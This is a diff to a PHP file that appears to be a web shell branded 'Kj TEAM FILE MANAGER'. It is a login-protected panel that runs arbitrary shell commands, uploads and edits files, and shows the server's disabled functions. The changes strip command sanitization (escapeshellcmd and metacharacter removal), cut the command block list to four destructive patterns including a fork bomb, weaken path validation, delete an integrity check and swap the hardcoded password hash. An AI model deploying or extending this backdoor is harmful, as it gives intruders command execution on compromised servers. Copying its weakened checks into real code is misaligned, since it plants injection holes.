@@ -16,11 +16,11 @@ function sanitizeInput($input) {
 // 2. Proteksi path traversal
 function validatePath($path) {
     $path = str_replace(['..', '\\', '//'], '', $path);
-    $path = realpath($path);
-    if ($path === false) {
-        return false;
+    // Cek apakah path valid
+    if (is_dir($path) || is_file($path)) {
+        return $path;
     }
-    return $path;
+    return false;
 }
 
 // 3. Cek file yang dicurigai
@@ -56,6 +56,7 @@ function isSuspiciousFile($content) {
 
 // 4. Backup otomatis sebelum perubahan
 function backupFile($filePath) {
+    if (!file_exists($filePath)) return false;
     $backupDir = dirname($filePath) . '/.backup_' . date('Ymd');
     if (!is_dir($backupDir)) {
         mkdir($backupDir, 0755, true);
@@ -64,25 +65,8 @@ function backupFile($filePath) {
     return copy($filePath, $backupFile);
 }
 
-// 5. Cek integritas file utama
-function checkIntegrity() {
-    $hashFile = __FILE__ . '.hash';
-    $currentHash = md5_file(__FILE__);
-    
-    if (file_exists($hashFile)) {
-        $savedHash = file_get_contents($hashFile);
-        if ($savedHash !== $currentHash) {
-            error_log("[KjTEAM] WARNING: File integrity compromised!");
-            return false;
-        }
-    } else {
-        file_put_contents($hashFile, $currentHash);
-    }
-    return true;
-}
-
-// 6. Rate limiting untuk operasi berbahaya
-function checkRateLimit($action, $limit = 10, $timeWindow = 300) {
+// 5. Rate limiting untuk operasi berbahaya
+function checkRateLimit($action, $limit = 20, $timeWindow = 300) {
     if (!isset($_SESSION['rate_limit'])) {
         $_SESSION['rate_limit'] = [];
     }
@@ -110,7 +94,7 @@ function checkRateLimit($action, $limit = 10, $timeWindow = 300) {
     return true;
 }
 
-// 7. Proteksi upload file
+// 6. Proteksi upload file
 function validateUploadedFile($file) {
     $allowedExtensions = ['txt', 'pdf', 'jpg', 'jpeg', 'png', 'gif', 'doc', 'docx', 'xls', 'xlsx', 'zip', 'rar', '7z'];
     $maxFileSize = 10 * 1024 * 1024;
@@ -141,7 +125,7 @@ function validateUploadedFile($file) {
     return ['success' => true];
 }
 
-// 8. Log aktivitas
+// 7. Log aktivitas
 function logActivity($action, $details = '') {
     $logFile = __DIR__ . '/kjteam_log.txt';
     $ip = $_SERVER['REMOTE_ADDR'];
@@ -152,8 +136,9 @@ function logActivity($action, $details = '') {
     @file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
 }
 
-// 9. Cek jika ada malware di file
+// 8. Cek jika ada malware di file
 function scanFileForMalware($filePath) {
+    if (!file_exists($filePath)) return false;
     $content = @file_get_contents($filePath);
     if (!$content) return false;
     
@@ -184,8 +169,9 @@ function scanFileForMalware($filePath) {
     return false;
 }
 
-// 10. Auto-quarantine untuk file mencurigakan
+// 9. Quarantine untuk file mencurigakan
 function quarantineFile($filePath) {
+    if (!file_exists($filePath)) return false;
     $quarantineDir = __DIR__ . '/.quarantine_' . date('Ymd');
     if (!is_dir($quarantineDir)) {
         mkdir($quarantineDir, 0700, true);
@@ -199,24 +185,9 @@ function quarantineFile($filePath) {
     return false;
 }
 
-// ============ CEK INTEGRITAS ============
-if (!checkIntegrity()) {
-    die("<!DOCTYPE html><html><head><title>Security Alert</title>
-    <style>body{background:#0a0e27;color:#ff6b6b;font-family:monospace;padding:50px;text-align:center;}
-    .alert{background:#1a0a0a;border:2px solid #ff6b6b;padding:30px;border-radius:10px;max-width:600px;margin:auto;}
-    h1{color:#ff6b6b;}p{color:#88ccff;}</style>
-    </head><body>
-    <div class='alert'>
-        <h1>⚠️ INTEGRITAS FILE TELAH DICOBA!</h1>
-        <p>File ini telah dimodifikasi tanpa izin. Akses ditolak.</p>
-        <p style='font-size:smaller;color:#6c8cba;'>Kj TEAM Security - Auto Protection</p>
-    </div>
-    </body></html>");
-}
-
 // ============ LOGIN ============
 $USERNAME = 'kjteam';
-$HASHED_PASSWORD = '$2y$10$mftX2JhqVH8.adFZQGKzAukkw9kl3SBx.SHiHqgHzvITtheDzuNXa';
+$HASHED_PASSWORD = '$2a$10$.uA/Cyb0M/ZEh68badUI8.qytAVEkZcvrrztbAERMz/eq6i.7cjom';
 $isWindows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
 
 // Proteksi brute force login
@@ -325,7 +296,7 @@ if (!isset($_SESSION['logged_in'])) {
     </head>
     <body>
         <form method="POST" class="login-box">
-            <img src="https://i.ibb.co/Df8g5PYb/kj.png" alt="Kj TEAM">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhjmxRSVrSL61y40Kj13ZqX_ZKLTK-TGBY9iE-5EbFG3Ple7egee3gw8Ztvw0gLANG5Bap-iRmxt1b9wQgWXBdT-RpagimZUsML0rAhwZUcUWmXDdepfXQC3JBrtdUkoPbZaaGRzLRcBX4X9IVeqhelc7oSAn1MSPUAUFucBjDh7i3ai-t9k6cOJQSQi9So/s16000/messageImage_1749903399972.jpg" alt="Kj TEAM">
             <h2>Kj TEAM PANEL</h2>
             <input type="text" name="username" placeholder="Username" required>
             <input type="password" name="password" placeholder="Password" required>
@@ -384,9 +355,13 @@ function runShellCommand($command) {
         ? str_replace('/', DIRECTORY_SEPARATOR, $inputPath)
         : str_replace('\\', DIRECTORY_SEPARATOR, $inputPath);
 
-    // Sanitasi command
-    $command = str_replace([';', '&&', '||', '`', '$'], '', $command);
-    $command = escapeshellcmd($command);
+    // Sanitasi command - HAPUS yang terlalu ketat, hanya blokir yang sangat berbahaya
+    $blockedPatterns = ['rm -rf /', 'dd if=/dev/zero', 'mkfs', ':(){ :|:& };:'];
+    foreach ($blockedPatterns as $pattern) {
+        if (strpos($command, $pattern) !== false) {
+            return "⚠️ Command diblokir untuk keamanan!";
+        }
+    }
     
     $command = "cd " . $currentPath . " && " . $command;
     
@@ -556,11 +531,11 @@ foreach ($allItems as $item) {
 if (isset($_POST['run_command'])) {
     $command = $_POST['command'];
     
-    // Blacklist command berbahaya
-    $blockedCommands = ['rm -rf', 'dd if=', 'mkfs', 'format', 'fdisk', 'shutdown', 'reboot', 'init 0', 'poweroff'];
+    // Blacklist command yang sangat berbahaya
+    $blockedCommands = ['rm -rf /', 'dd if=/dev/zero', 'mkfs', ':(){ :|:& };:'];
     foreach ($blockedCommands as $blocked) {
         if (strpos($command, $blocked) !== false) {
-            $message = "⚠️ Command diblokir untuk keamanan: $blocked";
+            $message = "⚠️ Command diblokir untuk keamanan!";
             $messageType = "error";
             logActivity('BLOCKED_COMMAND', "Blocked: $command");
             goto skip_command;
@@ -677,7 +652,7 @@ if (isset($_POST['save_edit'])) {
 
 if (isset($_POST['upload']) && isset($_FILES['uploaded_file'])) {
     $validation = validateUploadedFile($_FILES['uploaded_file']);
-    if ($validation['error']) {
+    if (isset($validation['error'])) {
         $message = $validation['error'];
         $messageType = "error";
     } else {
@@ -1021,7 +996,7 @@ if (isset($_POST['quarantine']) && isset($_POST['delete_path'])) {
 <body>
     <?php echo "<pre style='background:#0d1117;color:#6c8cba;border-color:#2d4a7a;'>Disable Functions: " . ini_get('disable_functions') . "</pre>"; ?>
     <div style="text-align:center; margin-bottom: 20px;">
-        <img src="https://i.ibb.co/Df8g5PYb/kj.png" alt="Kj TEAM" class="header-img">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhjmxRSVrSL61y40Kj13ZqX_ZKLTK-TGBY9iE-5EbFG3Ple7egee3gw8Ztvw0gLANG5Bap-iRmxt1b9wQgWXBdT-RpagimZUsML0rAhwZUcUWmXDdepfXQC3JBrtdUkoPbZaaGRzLRcBX4X9IVeqhelc7oSAn1MSPUAUFucBjDh7i3ai-t9k6cOJQSQi9So/s16000/messageImage_1749903399972.jpg" alt="Kj TEAM" class="header-img">
         <h1 style="color:#88ccff; font-family:monospace; text-shadow: 0 0 20px rgba(45, 74, 122, 0.5);">Kj TEAM FILE MANAGER</h1>
         <div>
             <span class="security-badge">🔒 Secure Mode</span>
